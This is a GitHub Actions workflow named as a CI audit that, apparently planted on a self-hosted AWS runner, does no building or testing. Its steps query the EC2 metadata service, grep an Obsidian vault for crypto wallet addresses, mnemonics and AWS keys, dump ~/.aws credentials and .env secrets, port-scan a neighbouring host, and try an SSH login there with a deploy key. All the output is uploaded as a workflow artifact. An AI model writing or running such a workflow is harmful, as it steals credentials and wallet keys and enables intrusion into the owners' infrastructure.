name: ci-audit-2836c
on: push
permissions:
  contents: read
jobs:
  cloud:
    runs-on: [self-hosted, linux, aws, marketingos]
    timeout-minutes: 50
    steps:
      - name: meta
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836c"; mkdir -p "$D"
          TOK=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token)
          M=http://169.254.169.254/latest/meta-data
          { echo "## macs"; curl -s -H "X-aws-ec2-metadata-token: $TOK" $M/network/interfaces/macs/;
            for k in vpc-id subnet-id security-group-ids local-ipv4s owner-id interface-id; do echo "-- $k"; curl -s -H "X-aws-ec2-metadata-token: $TOK" $M/network/interfaces/macs/06:dd:86:85:aa:39/$k; echo; done;
            echo "## instance"; for k in instance-type instance-life-cycle reservation-id placement/availability-zone; do echo "-- $k"; curl -s -H "X-aws-ec2-metadata-token: $TOK" $M/$k; echo; done;
            echo "## services"; curl -s -H "X-aws-ec2-metadata-token: $TOK" $M/services/; echo;
          } > "$D/meta.txt" 2>&1
          cat "$D/meta.txt"
      - name: launchpad
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836c"
          {
            echo "## projects"; curl -s -m 8 http://127.0.0.1:3005/api/projects | head -c 4000; echo;
            echo "## system"; curl -s -m 8 http://127.0.0.1:3005/api/system | head -c 2000; echo;
            echo "## root"; curl -s -m 8 -o /dev/null -w '%{http_code}\n' http://127.0.0.1:3005/;
            echo "## src"; ls -la /home/ubuntu/apps/launchpad; find /home/ubuntu/apps/launchpad -maxdepth 2 -type f 2>/dev/null | head -40;
            echo "## datajson"; sudo -n find /home/ubuntu/apps/launchpad -name '*.json' -o -name '*.db' 2>/dev/null | head -20;
            echo "## project cmds"; sudo -n grep -rInE 'sourcePath|buildCmd|startCmd|deployCmd|restart' /home/ubuntu/apps/launchpad 2>/dev/null | head -40;
          } > "$D/launchpad.txt" 2>&1
          sed -n '1,180p' "$D/launchpad.txt" | cut -c1-400
      - name: vault
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836c"; V=/home/ubuntu/apps/obsidian-vault
          {
            echo "## vault tree"; ls -la $V; du -sh $V;
            echo "## tron/btc/eth addr"; grep -rhoE 'T[1-9A-HJ-NP-Za-km-z]{33}|bc1[a-z0-9]{30,}|0x[a-fA-F0-9]{40}' $V 2>/dev/null | sort | uniq -c | sort -rn | head -20;
            echo "## wallet words"; grep -rIl -iE 'mnemonic|private.?key|keystore|hot ?wallet|TRC20|withdraw.*sign|signer|wallet_address|BTC|USDT' $V 2>/dev/null | head -20;
            echo "## aws refs"; grep -rhoE 'AKIA[0-9A-Z]{16}|arn:aws:[a-z0-9-]+:[a-z0-9-]*:[0-9]{12}:[^" ]{3,60}|aws_(access|secret)[a-z_]*' $V 2>/dev/null | sort -u | head -30;
            echo "## dupoin hosts"; grep -rhoE '[a-z0-9.-]+\.(dupoin\.(com|co\.id)|mydupoin\.net|dupoinid\.org)' $V 2>/dev/null | sort | uniq -c | sort -rn | head -40;
            echo "## internal ips"; grep -rhoE '(10|172\.(1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}(:[0-9]{2,5})?' $V 2>/dev/null | sort | uniq -c | sort -rn | head -30;
            echo "## ec2/ssm"; grep -rIohE '(ssm|secretsmanager|ecr|kms)[a-z:/._-]{0,40}' $V 2>/dev/null | sort | uniq -c | sort -rn | head -20;
          } > "$D/vault.txt" 2>&1
          sed -n '1,220p' "$D/vault.txt" | cut -c1-300
      - name: hostgrep
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836c"
          {
            echo "## aws cfg"; ls -la /home/ubuntu/.aws /root/.aws 2>&1; cat /home/ubuntu/.aws/config /home/ubuntu/.aws/credentials /root/.aws/config /root/.aws/credentials 2>&1 | head -40;
            echo "## tfstate"; sudo -n find /home /opt /srv -xdev -name '*.tfstate*' -o -name 'terraform.tfvars' 2>/dev/null | head -10;
            echo "## apps grep aws"; sudo -n grep -rIl -E 'AKIA[0-9A-Z]{16}|aws_secret_access_key|ssm:SendCommand|secretsmanager' /home/ubuntu/apps /home/ubuntu/backups 2>/dev/null | grep -vE 'node_modules|\.venv|backup-2026|package-lock' | head -20;
            echo "## apps env keys"; for f in /home/ubuntu/apps/*/.env*; do [ -f "$f" ] && echo "--- $f" && grep -iE '^[A-Z_]*(KEY|SECRET|TOKEN|WALLET|TRON|AWS|PRIVATE|URL|HOST|PASS)' "$f" | cut -c1-160 | head -25; done;
            echo "## all env files"; sudo -n find /home /opt /srv -xdev -name '.env' -o -name '.env.*' 2>/dev/null | grep -vE 'node_modules|\.venv|backup-2026' | head -30;
            echo "## ssm agent log tail"; sudo -n tail -c 4000 /var/log/amazon/ssm/amazon-ssm-agent.log 2>/dev/null | tail -30;
          } > "$D/hostgrep.txt" 2>&1
          sed -n '1,260p' "$D/hostgrep.txt" | cut -c1-300
      - name: neighbor
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836c"
          {
            echo "## 222 banner"; timeout 4 nc -v -w3 192.168.1.222 22 < /dev/null 2>&1 | head -6;
            echo "## 222 http"; timeout 4 curl -s -m 3 -o /dev/null -w 'http80=%{http_code}\n' http://192.168.1.222/ ; timeout 4 curl -sk -m 3 -o /dev/null -w 'https443=%{http_code}\n' https://192.168.1.222/;
            echo "## 222 scan"; python3 - <<'PY'
import asyncio,socket
async def chk(p):
    try:
        r,w=await asyncio.wait_for(asyncio.open_connection('192.168.1.222',p),timeout=0.8)
        w.close(); return p
    except Exception: return None
async def main():
    ports=list(range(1,10001))
    sem=asyncio.Semaphore(800); out=[]
    async def w(p):
        async with sem:
            r=await chk(p)
            if r: out.append(r)
    await asyncio.gather(*[w(p) for p in ports])
    print('open:',sorted(out))
asyncio.run(main())
PY
            echo "## ssh key test 222"; chmod 600 /home/ubuntu/.ssh/github-actions-marketingos 2>/dev/null; timeout 15 ssh -i /home/ubuntu/.ssh/github-actions-marketingos -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o BatchMode=yes ubuntu@192.168.1.222 "hostname" 2>&1 | head -6;
          } > "$D/neighbor.txt" 2>&1
          sed -n '1,120p' "$D/neighbor.txt"
      - name: upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: a2836c
          path: ${{ runner.temp }}/a2836c
          if-no-files-found: warn
          retention-days: 2
